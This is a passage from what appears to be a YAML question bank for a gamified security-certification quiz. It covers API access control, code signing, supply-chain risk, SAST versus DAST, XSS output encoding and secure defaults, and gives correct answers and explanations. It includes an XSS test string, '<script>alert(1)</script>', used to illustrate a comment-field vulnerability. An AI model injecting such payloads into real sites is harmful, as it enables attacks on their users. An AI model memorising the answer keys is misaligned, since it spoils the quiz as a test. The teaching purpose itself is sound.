          \ compromised allies, and simple guessing. Once discovered, an obscure URL\nprovides zero protection.\
          \ Real security requires authentication and authorization\nregardless of URL complexity.\n \
          \                   "
        2: "\nHTTP method (GET vs POST) is not an access control. Both can be easily sent by\nattackers.\
          \ POST provides no more protection than GET. Access control requires\nauthentication (verifying\
          \ identity) and authorization (checking permissions),\nnot request method restrictions.\n  \
          \                  "
        3: "\nNames are not security controls. Calling something \"private\" doesn't make it\nprivate.\
          \ Security requires technical controls: authentication to verify\nidentity, authorization to\
          \ check permissions, encryption to protect data.\nLabels without enforcement are meaningless.\n\
          \                    "
    corporate:
      title: THE EXPOSED API
      narrative: "\nThe mobile team built a REST API for the new app. Security testing reveals\nproblems:\
        \ anyone who knows the endpoint URLs can access sensitive data. There's\nno authentication, authorization,\
        \ or rate limiting.\n\n\"We didn't add security because only our app uses the API,\" the developer\n\
        explains. \"The URLs are complex and not documented anywhere public.\"\n\nYou test the API. You\
        \ can read any user's profile by changing the user ID in\nthe URL. You can access admin functions\
        \ without any credentials.\n\nWhat security controls should this API implement?\n            \
        \    "
      choices:
      - text: Make endpoint URLs longer and more random
      - text: Implement authentication, authorization, and rate limiting
      - text: Only accept POST requests
      - text: Rename the API to include 'private' or 'internal'
      success_text: "\n\"API security isn't optional because the URL is 'complex,'\" you explain. \"Anyone\n\
        can intercept the mobile app's traffic and extract those URLs. Let me show you.\"\n\nYou demonstrate\
        \ with a proxy tool, capturing all API calls from the app.\n\n\"Here's what you need:\"\n\n\"\
        AUTHENTICATION: JWT tokens, OAuth, or API keys. Every request must prove\nidentity. Don't trust\
        \ the client - verify on the server.\"\n\n\"AUTHORIZATION: Check permissions for every request.\
        \ User A shouldn't access\nUser B's data. Non-admins shouldn't access admin endpoints. Verify\
        \ on the server.\"\n\n\"RATE LIMITING: Prevent brute force, enumeration, and abuse. Block excessive\n\
        requests. Detect suspicious patterns.\"\n\n\"INPUT VALIDATION: The API must validate all input.\
        \ Don't trust that the app\nsends clean data - attackers will send whatever they want directly.\"\
        \n\nYou help them implement proper API security. The exposed endpoints are now protected.\n\n\
        You have demonstrated proper API SECURITY controls.\n                "
      failure_texts:
        0: "\nURL complexity is security through obscurity - and obscurity fails. Attackers\nwill discover\
          \ URLs by intercepting app traffic, reverse-engineering the app,\nor simple brute force. Once\
          \ known, a complex URL provides zero protection.\nUse real security: authentication, authorization,\
          \ rate limiting.\n                    "
        2: "\nHTTP method is not an access control. Attackers can send POST requests as easily\nas GET.\
          \ The method doesn't verify identity or check permissions. Real API security\nrequires authentication\
          \ (who are you) and authorization (what can you access).\n                    "
        3: "\nNames don't provide security. \"Internal\" or \"private\" labels mean nothing to\nattackers\
          \ who can still reach the endpoint. Security requires technical controls\nthat enforce access\
          \ restrictions, not naming conventions that request (but don't\nenforce) privacy.\n        \
          \            "
- id: d8_secure_deployment
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - Secure Deployment'
  failure_text: "\nSecure software deployment requires verifiable authenticity and integrity.\nCODE SIGNING\
    \ uses cryptographic signatures: developers sign packages with private\nkeys, users verify with public\
    \ keys. This proves packages are from the expected\nsource and haven't been tampered with. Even if\
    \ attackers compromise distribution\nchannels, they can't create valid signatures without the private\
    \ key. Always\nverify signatures before installation. Speed and secrecy don't substitute for\ncryptographic\
    \ verification.\n        "
  themes:
    fantasy:
      title: THE REPLACED SCROLLS
      narrative: "\nThe Citadel distributes enchanted scrolls to allied kingdoms. Recently, a kingdom\n\
        reported that a scroll they received contained a curse instead of the intended\nprotection spell.\n\
        \nInvestigation reveals that an attacker intercepted the delivery and replaced\nthe legitimate\
        \ scroll with a malicious copy. The receiving kingdom had no way\nto verify that the scroll was\
        \ authentic.\n\n\"The delivery route was secure!\" protests the Courier Master. \"How could they\n\
        know it was replaced?\"\n\nWhat control would have allowed the kingdom to verify scroll authenticity?\n\
        \                "
      choices:
      - text: Deploy scrolls faster to reduce interception opportunities
      - text: Use cryptographic sealing with signature verification
      - text: Keep deployment procedures secret
      - text: Only deploy on specific days of the week
      success_text: "\n\"Speed and secrecy won't help if you can't VERIFY authenticity,\" you explain.\n\
        \"What we need is CRYPTOGRAPHIC SEALING - a magical signature that proves the\nscroll originated\
        \ from us and wasn't modified.\"\n\nYou demonstrate: \"Before deployment, we seal each scroll\
        \ with our Citadel's\nsecret binding. The allied kingdom can verify this seal using our public\
        \ emblem.\nIf the seal doesn't match - the scroll was tampered with or replaced.\"\n\nThe Courier\
        \ Master asks, \"But what if someone copies our seal?\"\n\n\"They can't. The seal is created using\
        \ our secret binding which only we possess.\nOthers can VERIFY the seal but cannot CREATE it.\
        \ Even if an attacker intercepts\nthe scroll, they cannot create a valid seal for their replacement.\"\
        \n\nYou implement code signing for all scroll deployments. Kingdoms now verify\nauthenticity before\
        \ use.\n\nYou have demonstrated SECURE DEPLOYMENT through code signing.\n                "
      failure_texts:
        0: "\nSpeed doesn't verify authenticity. A faster delivery still delivers whatever\nthe courier\
          \ carries - legitimate or malicious. Even with instant delivery, if\nyou can't verify the package\
          \ came from the expected source and wasn't modified,\nyou can't trust it. Signature verification\
          \ solves this regardless of speed.\n                    "
        2: "\nSecret procedures don't verify authenticity. Attackers can discover procedures\nthrough\
          \ observation, social engineering, or compromised insiders. Once they\nknow the procedure, secrecy\
          \ provides no protection. Cryptographic signatures\nwork regardless of whether attackers know\
          \ your procedures.\n                    "
        3: "\nTiming doesn't verify authenticity. Whether you deploy Monday or Friday, you\nstill need\
          \ a way to verify packages weren't tampered with. Cryptographic\nsignatures provide this verification\
          \ regardless of deployment timing.\n                    "
    corporate:
      title: THE MALICIOUS UPDATE
      narrative: "\nThe company distributes software updates to thousands of customer installations.\n\
        Recently, customers reported malware in an update - investigation reveals an\nattacker compromised\
        \ a distribution mirror and replaced the legitimate update\nwith a malicious version.\n\nCustomers\
        \ downloaded and installed it because it appeared to come from the\nofficial distribution channel.\n\
        \n\"The mirror was supposed to be secure!\" the Release Manager protests.\n\nWhat control would\
        \ have allowed customers to detect the tampered update?\n                "
      choices:
      - text: Faster release cycles to reduce window for attack
      - text: Code signing and signature verification before installation
      - text: Keeping distribution procedures confidential
      - text: Only releasing updates on specific days
      success_text: "\n\"The issue is that customers couldn't VERIFY the update was authentic,\" you\n\
        explain. \"Code signing solves this.\"\n\nYou diagram the solution: \"We sign every release with\
        \ our private key. Customers\nverify the signature with our public key before installation. If\
        \ an attacker\nreplaces the package, they can't create a valid signature - they don't have our\n\
        private key.\"\n\nThe Release Manager asks, \"But the attacker controlled the mirror...\"\n\n\"\
        Doesn't matter. They can distribute whatever they want, but they can't SIGN it\nwith our key.\
        \ Customers' verification will reject unsigned or incorrectly signed\npackages.\"\n\nYou implement\
        \ code signing:\n\"1. Build package\n2. Sign with private key\n3. Distribute\n4. Customer downloads\n\
        5. Customer verifies signature\n6. Only install if signature valid\"\n\nThe tampered update would\
        \ have been rejected at step 5 if code signing were in place.\n\nYou have demonstrated SECURE\
        \ DEPLOYMENT through code signing.\n                "
      failure_texts:
        0: "\nFaster releases don't prevent tampering. Whether you release daily or monthly,\nyou still\
          \ need a way for customers to verify authenticity. Speed reduces the\nwindow of opportunity\
          \ slightly but doesn't eliminate the vulnerability. Code\nsigning provides verification regardless\
          \ of release frequency.\n                    "
        2: "\nConfidential procedures don't verify authenticity. Attackers discover procedures\nthrough\
          \ various means. Once they control a distribution point, knowing the\nprocedure just helps them\
          \ blend in. Cryptographic signatures verify authenticity\nregardless of what attackers know\
          \ about your procedures.\n                    "
        3: "\nRelease timing doesn't verify authenticity. Whether you release on Tuesdays or\nFridays,\
          \ customers still need to verify updates weren't tampered with. Code\nsigning provides this\
          \ regardless of when releases occur.\n                    "
- id: d8_third_party_risk
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - Third-Party Risk'
  failure_text: "\nThird-party software introduces supply chain risk. Managing this requires:\n(1) SOFTWARE\
    \ COMPOSITION ANALYSIS (SCA) tools that scan dependencies against\nvulnerability databases, (2) INTEGRITY\
    \ VERIFICATION with locked versions and\nchecksums, (3) DEPENDENCY MONITORING for newly disclosed\
    \ vulnerabilities,\n(4) MINIMAL DEPENDENCIES to reduce attack surface. Popularity doesn't indicate\n\
    security - popular packages are high-value targets. Manual review doesn't scale.\nAvoiding third-party\
    \ code entirely isn't practical. Systematic management is required.\n        "
  themes:
    fantasy:
      title: THE BORROWED ENCHANTMENTS
      narrative: "\nThe Citadel's artifacts incorporate enchantments from dozens of external sources\n\
        - allied mages, foreign guilds, and ancient repositories. An audit reveals that\none borrowed\
        \ enchantment, used in 50 of your artifacts, contains a hidden curse.\n\n\"But that enchantment\
        \ is from a popular public repository!\" the Artificer protests.\n\"It has thousands of users!\
        \ How could we have known?\"\n\nYou note that the curse was added in a recent version update.\
        \ The Citadel\nautomatically pulled the latest version without review.\n\nWhat process should\
        \ have detected this risk?\n                "
      choices:
      - text: Only use enchantments with many users - popularity means security
      - text: Component analysis with vulnerability scanning and integrity verification
      - text: Manually review all external enchantment source code
      - text: Avoid all external enchantments - only use internal ones
      success_text: "\n\"Popularity doesn't mean security,\" you explain. \"Popular components have been\n\
        compromised before - event-stream, ua-parser-js, colors. The more popular, the\nmore attractive\
        \ a target.\"\n\nYou outline proper third-party management:\n\n\"COMPONENT INVENTORY: Know exactly\
        \ what external enchantments you use. Create\na bill of materials.\"\n\n\"VULNERABILITY SCANNING:\
        \ Check known vulnerability databases automatically.\nFlag components with disclosed security\
        \ issues.\"\n\n\"INTEGRITY VERIFICATION: Pin specific versions. Verify checksums. Detect if a\n\
        component changes unexpectedly.\"\n\n\"AUTOMATED MONITORING: When new vulnerabilities are disclosed,\
        \ immediately know\nif you're affected.\"\n\nThe Artificer asks, \"Can we scan everything manually?\"\
        \n\n\"For 50+ dependencies? No. This requires automated tools - Software Composition\nAnalysis.\
        \ They maintain vulnerability databases and continuously scan your\ninventory.\"\n\nYou implement\
        \ SCA scanning in the artifact creation pipeline.\n\nYou have demonstrated THIRD-PARTY SOFTWARE\
        \ RISK management.\n                "
      failure_texts:
        0: "\nPopularity doesn't indicate security. Popular packages are high-value targets.\nEvent-stream\
          \ had millions of downloads when it was compromised. Popularity\nmeans more eyes (sometimes\
          \ good) but also more attacker interest. Systematic\nscanning and integrity verification are\
          \ required regardless of popularity.\n                    "
        2: "\nManual review doesn't scale. With dozens of dependencies, each with their own\ndependencies,\
          \ you might have hundreds of external components. Manual review of\nall source code is infeasible.\
          \ Automated Software Composition Analysis tools\nmaintain vulnerability databases and scan continuously\
          \ - what humans cannot do.\n                    "
        3: "\nAvoiding external components is impractical. You'd reinvent everything from\nscratch - authentication,\
          \ encryption, parsing, networking. You'd likely create\nMORE vulnerabilities than battle-tested\
          \ external libraries contain. The answer\nis proper management (scanning, verification, monitoring),\
          \ not avoidance.\n                    "
    corporate:
      title: THE COMPROMISED LIBRARY
      narrative: "\nThe development team uses 50 open-source packages from npm. A security alert\nreveals\
        \ that one package, used across 12 applications, was compromised - a\nmalicious maintainer pushed\
        \ a version that exfiltrates environment variables.\n\n\"We trusted that package!\" the developer\
        \ says. \"It has a million downloads!\"\n\nInvestigation shows the malicious version was published\
        \ three weeks ago. Your\napplications have been leaking secrets ever since.\n\nWhat process should\
        \ have detected this before deployment?\n                "
      choices:
      - text: Only use packages with more than a million downloads
      - text: Software Composition Analysis with vulnerability and integrity checking
      - text: Manually read all source code of every dependency
      - text: Write everything in-house to avoid third-party code
      success_text: "\n\"Download counts don't indicate security,\" you explain. \"This package HAD a\n\
        million downloads - and was still compromised. Let me show you proper third-party\nrisk management.\"\
        \n\nYou outline the solution:\n\n\"SOFTWARE COMPOSITION ANALYSIS (SCA): Tools that scan your dependencies\
        \ against\nvulnerability databases. When a vulnerability is disclosed, you're alerted immediately.\"\
        \n\n\"INTEGRITY VERIFICATION: Lock file exact versions. Verify package checksums.\nDetect unexpected\
        \ changes.\"\n\n\"DEPENDENCY MONITORING: Services that watch your bill of materials and alert\
        \ on\nnew vulnerabilities in components you use.\"\n\n\"MINIMAL DEPENDENCIES: Use only what you\
        \ need. Every dependency is attack surface.\"\n\nThe developer asks, \"How do we handle 50 packages?\"\
        \n\n\"Automation. SCA tools scan your package-lock.json and check every dependency,\nincluding\
        \ transitive ones. The compromised package would have triggered alerts\nwhen its behavior changed\
        \ unexpectedly.\"\n\nYou implement SCA in the CI/CD pipeline. New vulnerabilities are caught before\
        \ merge.\n\nYou have demonstrated THIRD-PARTY SOFTWARE RISK management.\n                "
      failure_texts:
        0: "\nDownload popularity doesn't equal security. High-download packages are valuable\ntargets\
          \ for attackers. The event-stream package had millions of downloads when\nattackers compromised\
          \ it to steal cryptocurrency. Systematic scanning and\nmonitoring are required regardless of\
          \ popularity metrics.\n                    "
        2: "\nManual review doesn't scale. Your 50 direct dependencies have their own\ndependencies -\
          \ you might have 500+ total packages. Reading all source code is\nimpossible. Software Composition\
          \ Analysis tools automate this by checking\nagainst known vulnerability databases and detecting\
          \ suspicious changes.\n                    "
        3: "\nWriting everything in-house creates MORE risk. You'd implement cryptography,\nauthentication,\
          \ and other security-critical code from scratch. Your implementations\nwould have more vulnerabilities\
          \ than battle-tested libraries. The answer is\nproper third-party management, not avoidance.\n\
          \                    "
- id: d8_supply_chain
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - Supply Chain Security'
  failure_text: "\nSupply chain attacks compromise software vendors, build tools, or dependencies\nto\
    \ attack downstream users. One compromise affects every organization that uses\nthe affected component.\
    \ Defenses include: (1) VERIFY INTEGRITY of all tools with\ncryptographic signatures, (2) PIN VERSIONS\
    \ rather than auto-updating, (3) MONITOR\nBEHAVIOR of trusted tools for anomalies, (4) MAINTAIN BILL\
    \ OF MATERIALS to know\nyour dependencies, (5) LIMIT TRUST even for trusted tools. SolarWinds demonstrated\n\
    that trusted vendors can be compromised.\n        "
  themes:
    fantasy:
      title: THE CORRUPTED TOOLS
      narrative: "\nThe kingdom uses enchanted forge tools provided by a renowned dwarven smith. These\n\
        tools are used to create every magical artifact in the realm.\n\nNews arrives that the dwarven\
        \ forge was compromised. Attackers modified the tools\nto add hidden weaknesses to every artifact\
        \ created with them. Thousands of artifacts\nacross dozens of kingdoms are now vulnerable.\n\n\
        \"But we inspected our raw materials and our finished artifacts!\" the Forge Master\nprotests.\
        \ \"How could the TOOLS be the problem?\"\n\nWhat type of attack is this, and what is a KEY defense?\n\
        \                "
      choices:
      - text: DDoS attack - implement redundant forges
      - text: Supply chain attack - verify tool integrity and use signed releases
      - text: Phishing attack - train the forge workers
      - text: Insider threat - conduct background checks on smiths
      success_text: "\n\"This is a SUPPLY CHAIN attack,\" you explain. \"The attacker didn't target individual\n\
        artifacts - they targeted the TOOLS used to create artifacts. Every artifact made\nwith the compromised\
        \ tools is affected.\"\n\n\"This is devastating because one compromise propagates to everything\
        \ downstream.\nThe SolarWinds attack worked this way - they compromised the build system, not\n\
        individual products.\"\n\nThe Forge Master asks, \"How do we defend against this?\"\n\n\"Multiple\
        \ layers:\n1. VERIFY TOOL INTEGRITY - Check signatures before using any tool or update\n2. USE\
        \ SIGNED RELEASES - Only accept tools with valid cryptographic signatures\n3. PIN VERSIONS - Don't\
        \ automatically update; review changes first\n4. MONITOR FOR CHANGES - Detect when tools behave\
        \ differently than expected\n5. DIVERSE SUPPLIERS - Don't depend on a single tool source for everything\"\
        \n\nYou implement tool verification procedures and integrity monitoring.\n\nYou have identified\
        \ a SUPPLY CHAIN ATTACK and its defenses.\n                "
      failure_texts:
        0: "\nDDoS attacks prevent access to services. This attack inserted malicious\nfunctionality into\
          \ creation tools. The tools worked perfectly - that's why\nno one noticed. Supply chain attacks\
          \ compromise the creation process, not\nthe availability of services.\n                    "
        2: "\nPhishing attacks trick people into revealing information or taking actions.\nThis attack\
          \ compromised the tools themselves, regardless of human action.\nEven the most alert workers\
          \ would use compromised tools unknowingly. Supply\nchain security focuses on verifying tool\
          \ and component integrity.\n                    "
        3: "\nThis was an external attack on the tool vendor, not an insider threat within\nyour organization.\
          \ Background checks on your staff wouldn't have prevented\nthe dwarven forge from being compromised.\
          \ Supply chain security requires\nverifying integrity of all external tools and dependencies.\n\
          \                    "
    corporate:
      title: THE SOLARWINDS LESSON
      narrative: "\nA widely-used network monitoring tool was compromised at its vendor. Attackers\ninserted\
        \ a backdoor into the build process. Every organization that updated to\nthe new version received\
        \ the backdoor - including government agencies and major\ncorporations.\n\nYour CISO asks: \"\
        We use similar tools from third parties. How do we prevent\nbecoming the next victim?\"\n\nThe\
        \ security team notes that you rely on dozens of third-party tools for\ndevelopment, monitoring,\
        \ and operations.\n\nWhat type of attack is this, and what is a KEY defense?\n                "
      choices:
      - text: DDoS attack - implement failover systems
      - text: Supply chain attack - verify integrity of all tools and use signed releases
      - text: Phishing attack - improve user awareness training
      - text: Insider threat - conduct background checks on employees
      success_text: "\n\"SolarWinds was a supply chain attack,\" you explain. \"Attackers didn't target\n\
        individual organizations - they compromised the vendor's build process. Everyone\nwho updated\
        \ became a victim.\"\n\n\"The terrifying part: the source code was clean. The backdoor was added\
        \ DURING\nthe build. Traditional security review couldn't detect it.\"\n\nYou outline defenses:\n\
        \n\"1. VERIFY INTEGRITY: Check cryptographic signatures on all tools and updates\n2. PIN VERSIONS:\
        \ Don't auto-update. Review changelogs. Test before deploying\n3. BEHAVIORAL MONITORING: Detect\
        \ when trusted tools behave unexpectedly\n4. ZERO TRUST: Treat even trusted tools as potential\
        \ threats. Limit their access\n5. BILL OF MATERIALS: Know exactly what third-party code you run.\
        \ Monitor for\n   vulnerabilities in your supply chain\"\n\nThe CISO asks, \"Can we just avoid\
        \ third-party tools?\"\n\n\"No - that's impractical. But we can verify, monitor, and limit trust.\
        \ Every\ntool is a potential attack vector. Treat them accordingly.\"\n\nYou have identified a\
        \ SUPPLY CHAIN ATTACK and its defenses.\n                "
      failure_texts:
        0: "\nDDoS prevents access to services. The SolarWinds attack added malicious\nfunctionality that\
          \ worked alongside legitimate features. Services remained\navailable - that's how it stayed\
          \ hidden for months. Supply chain attacks\ncompromise integrity, not availability.\n       \
          \             "
        2: "\nNo amount of phishing training prevents supply chain attacks. The update came\nthrough legitimate\
          \ channels from a trusted vendor. Users did nothing wrong by\ninstalling it. Supply chain security\
          \ requires verifying tool integrity, not\njust training users to avoid suspicious emails.\n\
          \                    "
        3: "\nBackground checks on your employees couldn't prevent a vendor from being\ncompromised. SolarWinds'\
          \ own developers were (presumably) thoroughly vetted.\nThe attack came from outside. Supply\
          \ chain security focuses on verifying\nintegrity of external components and tools.\n       \
          \             "
- id: d8_sast_dast
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - SAST vs DAST'
  failure_text: "\nSAST (Static Application Security Testing) analyzes SOURCE CODE without executing\n\
    it. It identifies vulnerable patterns, insecure functions, and coding errors by\nexamining the code\
    \ itself. DAST (Dynamic Application Security Testing) tests\nRUNNING APPLICATIONS by sending requests\
    \ and analyzing responses. It finds runtime\nvulnerabilities, configuration issues, and real attack\
    \ vectors. The names reflect\nthe approach: Static = not running; Dynamic = running. Both are essential\
    \ for\ncomprehensive security testing - they find different types of issues.\n        "
  themes:
    fantasy:
      title: THE TWO INSPECTORS
      narrative: "\nThe Citadel employs two types of artifact inspectors. The first reads enchantment\n\
        scrolls and identifies potential flaws in the spell patterns without casting them.\nThe second\
        \ casts the enchantments in a protected chamber and observes their actual\nbehavior.\n\nAn apprentice\
        \ asks: \"What are these inspection methods called, and how do they\ndiffer?\"\n\nOne inspector\
        \ examines spell scrolls. The other tests running enchantments.\n                "
      choices:
      - text: 'Running enchantments: Static Analysis; Scrolls: Dynamic Analysis'
      - text: 'Running enchantments: Dynamic Analysis; Scrolls: Static Analysis'
      - text: Both are called Static Analysis
      - text: Both are called Penetration Testing
      success_text: "\n\"The terms describe what is being analyzed,\" you explain.\n\n\"STATIC ANALYSIS\
        \ examines code WITHOUT executing it. Like reading a spell scroll\nand identifying flawed sigils\
        \ before casting. Fast, thorough coverage, catches\nmany issues early - but may miss problems\
        \ that only manifest at runtime.\"\n\n\"DYNAMIC ANALYSIS tests RUNNING applications. Like casting\
        \ a spell in a chamber\nand observing its actual behavior. Finds runtime issues, configuration\
        \ problems,\nand real attack vectors - but only tests what it actually executes.\"\n\nThe apprentice\
        \ asks, \"Which is better?\"\n\n\"Neither. They're complementary. Static analysis catches issues\
        \ in the entire\ncodebase quickly. Dynamic analysis catches issues that only appear during\nexecution.\
        \ Use BOTH for comprehensive coverage.\"\n\n\"In security terms: SAST (Static Application Security\
        \ Testing) and DAST\n(Dynamic Application Security Testing). Your security testing should include\
        \ both.\"\n\nYou have explained the difference between STATIC and DYNAMIC analysis.\n        \
        \        "
      failure_texts:
        0: "\nThis reverses the definitions. STATIC analysis examines code without running it.\nDYNAMIC\
          \ analysis tests running applications. \"Static\" = stationary/not executing.\n\"Dynamic\" =\
          \ moving/executing. SAST scans source code; DAST tests running apps.\n                    "
        2: "\nThey are fundamentally different approaches. Static analysis examines source code\nwithout\
          \ execution - like reviewing blueprints. Dynamic analysis tests running\napplications - like\
          \ inspecting a finished building. Both are valuable. Both are\ndifferent. Using only one leaves\
          \ gaps.\n                    "
        3: "\nPenetration testing is a broader term for simulating attacks. SAST and DAST are\nspecific\
          \ automated testing types. DAST is somewhat similar to automated pen\ntesting, but SAST is quite\
          \ different - it analyzes code rather than attacking\nrunning systems. The terms describe the\
          \ testing methodology, not just the goal.\n                    "
    corporate:
      title: THE TESTING CONFUSION
      narrative: "\nThe security team is implementing automated security testing. A junior analyst\nasks\
        \ about tools: \"I see some tools scan source code and others send requests\nto running applications.\
        \ What's the difference?\"\n\nThe senior analyst explains that one tool type is for 'static' testing\
        \ and\nanother for 'dynamic' testing, but the junior is still confused.\n\nHelp clarify: A tool\
        \ that analyzes SOURCE CODE without running it is what type?\nA tool that sends requests to a\
        \ RUNNING APPLICATION is what type?\n                "
      choices:
      - text: 'Running application: SAST; Source code: DAST'
      - text: 'Running application: DAST; Source code: SAST'
      - text: Both are called SAST
      - text: Both are called penetration testing
      success_text: "\n\"Let me clarify the terminology,\" you tell the junior analyst.\n\n\"SAST - Static\
        \ Application Security Testing - analyzes source code WITHOUT\nexecuting it. Think of it as reading\
        \ the blueprints. It finds issues like:\ninsecure coding patterns, hardcoded secrets, vulnerable\
        \ function calls.\"\n\n\"DAST - Dynamic Application Security Testing - tests RUNNING applications\
        \ by\nsending requests and analyzing responses. Think of it as testing a live building.\nIt finds\
        \ issues like: authentication bypasses, configuration errors, injection\nvulnerabilities in runtime.\"\
        \n\n\"The key word is in the name: STATIC means not moving (code analysis). DYNAMIC\nmeans moving\
        \ (running application).\"\n\nThe junior asks, \"Which should we use?\"\n\n\"Both. SAST catches\
        \ issues early in development - immediate feedback to developers.\nDAST catches runtime issues\
        \ that SAST can't see. They complement each other.\nNeither alone is sufficient.\"\n\nYou have\
        \ explained the difference between SAST and DAST.\n                "
      failure_texts:
        0: "\nThis reverses the definitions. Think about the words: STATIC means stationary,\nnot running.\
          \ DAST = Dynamic = moving = running application. SAST = Static =\nstill = source code analysis.\
          \ SAST scans code; DAST tests running apps.\n                    "
        2: "\nSAST and DAST are distinct testing types. SAST analyzes code without execution.\nDAST tests\
          \ running applications. They find different types of issues. Using\nonly one approach leaves\
          \ significant gaps. A comprehensive security testing\nprogram uses both.\n                 \
          \   "
        3: "\nPenetration testing is manual attack simulation by security professionals.\nSAST and DAST\
          \ are automated scanning tools. While DAST resembles automated\npen testing, SAST is fundamentally\
          \ different - it's code analysis, not attack\nsimulation. The terms describe specific testing\
          \ methodologies.\n                    "
- id: d8_output_encoding
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - Output Encoding'
  failure_text: "\nOutput encoding is essential for XSS prevention. When displaying user-generated\ncontent,\
    \ special characters must be converted to safe equivalents: < becomes &lt;,\n> becomes &gt;, & becomes\
    \ &amp;, etc. This ensures content is displayed as TEXT,\nnot interpreted as CODE. Use context-appropriate\
    \ encoding: HTML encoding for HTML,\nJavaScript encoding for JS strings, URL encoding for URLs. Never\
    \ strip characters\n(breaks legitimate content) or rely on client-side sanitization (too late). Encode\n\
    on the server before rendering.\n        "
  themes:
    fantasy:
      title: THE DISPLAYED RUNES
      narrative: "\nThe Citadel's message board displays citizen messages on the great hall wall.\nA prankster\
        \ submitted a message containing spell-runes: '<fire>ignite</fire>'\n\nWhen displayed, the runes\
        \ executed, briefly setting the wall on fire. No one\nwas hurt, but the potential for harm is\
        \ clear.\n\n\"We need to prevent spell-runes from executing when displayed,\" says the Scribe\n\
        Master. \"How should we handle the < and > rune-brackets in displayed content?\"\n           \
        \     "
      choices:
      - text: Remove all bracket characters from messages
      - text: Convert < to display-rune '&lt;' and > to '&gt;' when rendering
      - text: Display messages inside hidden spell-dampening fields
      - text: Use JavaScript to process the messages client-side
      success_text: "\n\"The solution is OUTPUT ENCODING,\" you explain. \"When we display a message,\
        \ we\ntransform special characters into their safe display equivalents.\"\n\n\"The spell-bracket\
        \ '<' becomes the display-rune '&lt;'. The closing '>' becomes\n'&gt;'. Now when someone views\
        \ the message, they see the LITERAL CHARACTERS\n< and > as text - they don't execute as spell\
        \ commands.\"\n\nYou demonstrate:\nOriginal: <fire>ignite</fire>\nDisplayed: &lt;fire&gt;ignite&lt;/fire&gt;\n\
        \n\"The reader sees '<fire>ignite</fire>' on the wall, but it's just TEXT. No spell\nexecutes.\"\
        \n\nThe Scribe Master asks, \"Why not just remove the brackets?\"\n\n\"Because legitimate messages\
        \ might discuss spells. A scholar might want to explain\n'<fire> is dangerous' - removing brackets\
        \ breaks their meaning. Encoding PRESERVES\ncontent while preventing execution.\"\n\nYou have\
        \ demonstrated OUTPUT ENCODING for XSS prevention.\n                "
      failure_texts:
        0: "\nRemoving characters breaks legitimate content. What if someone wants to discuss\nspell syntax?\
          \ What about mathematical expressions using < and >? Stripping\ncharacters is heavy-handed and\
          \ loses information. ENCODING preserves the content\nwhile preventing execution.\n         \
          \           "
        2: "\n\"Hidden\" fields don't prevent execution - they just hide it from view. The spell\nwould\
          \ still run, just invisibly. Security isn't about hiding problems; it's about\npreventing them.\
          \ Output encoding transforms dangerous characters so they CAN'T\nexecute, regardless of visibility.\n\
          \                    "
        3: "\nClient-side processing doesn't prevent XSS - it often ENABLES it. If malicious\ncontent\
          \ reaches the client unencoded, it can execute. XSS prevention requires\nSERVER-SIDE output\
          \ encoding before content is sent to clients. Never rely on\nclient-side JavaScript for security.\n\
          \                    "
    corporate:
      title: THE USER COMMENTS
      narrative: "\nThe website displays user comments. A test reveals that typing '<script>alert(1)</script>'\n\
        in a comment causes the script to execute when the page is viewed.\n\n\"The comment should just\
        \ display as text, not run as code!\" says the developer.\n\nHow should the application handle\
        \ special characters like < and > when displaying\nuser-generated content to prevent XSS?\n  \
        \              "
      choices:
      - text: Strip all < and > characters from user input
      - text: 'HTML-encode output: convert < to &lt; and > to &gt;'
      - text: Hide user comments in display:none elements
      - text: Use client-side JavaScript to sanitize content
      success_text: "\n\"The fix is OUTPUT ENCODING,\" you explain. \"When rendering user content to HTML,\n\
        we encode special characters as their HTML entity equivalents.\"\n\nYou show the transformation:\n\
        Input: <script>alert(1)</script>\nOutput HTML: &lt;script&gt;alert(1)&lt;/script&gt;\n\n\"The\
        \ browser sees '&lt;' and displays the literal character '<'. It doesn't\ninterpret it as an HTML\
        \ tag. The script tag is VISIBLE as text, not EXECUTABLE\nas code.\"\n\nThe developer asks, \"\
        Why not just strip the characters?\"\n\n\"Because users might legitimately discuss code. A programming\
        \ forum needs to show\n'<html>' without executing it. Encoding preserves the content while preventing\n\
        execution.\"\n\n\"Also, use context-appropriate encoding: HTML encoding for HTML context, JavaScript\n\
        encoding for JS context, URL encoding for URLs. The encoding must match where the\ncontent is\
        \ rendered.\"\n\nYou have demonstrated OUTPUT ENCODING for XSS prevention.\n                "
      failure_texts:
        0: "\nStripping characters breaks legitimate content. Tech forums need to display code\nsnippets.\
          \ Users might discuss HTML, XML, or other angle-bracket syntax. Removing\ncharacters is destructive.\
          \ ENCODING preserves content while preventing execution.\n                    "
        2: "\nCSS display:none doesn't prevent execution - it only hides the element visually.\nThe script\
          \ still runs; you just don't see the output. XSS prevention requires\npreventing execution entirely,\
          \ not hiding its effects. Output encoding\ntransforms the content so it CAN'T execute.\n   \
          \                 "
        3: "\nClient-side sanitization is too late - the malicious content has already reached\nthe browser.\
          \ Attackers can disable JavaScript or modify it. XSS prevention must\nhappen SERVER-SIDE through\
          \ output encoding before content is sent. Never trust\nclient-side security for sensitive operations.\n\
          \                    "
- id: d8_secure_config
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - Secure Configuration'
  failure_text: "\nSecure by Default means applications should ship in a hardened state, requiring\nexplicit\
    \ action to REDUCE security rather than to establish it. This includes:\n(1) NO DEFAULT CREDENTIALS\
    \ - require strong passwords on first access,\n(2) DEBUGGING DISABLED - stack traces help attackers,\n\
    (3) MINIMAL FEATURES - disable what isn't needed,\n(4) RESTRICTIVE PERMISSIONS - start locked down.\n\
    \"We'll harden it later\" usually means \"we'll harden it after the breach.\"\nSecurity configuration\
    \ must happen BEFORE deployment.\n        "
  themes:
    fantasy:
      title: THE WIZARD'S DEFAULTS
      narrative: "\nA new apprentice wizard has deployed a messaging crystal for the Council. You\nperform\
        \ a security review and find concerning defaults:\n\n- Administrator access uses password 'admin123'\
        \ (the vendor default)\n- Debugging spells are active (showing internal workings to anyone)\n\
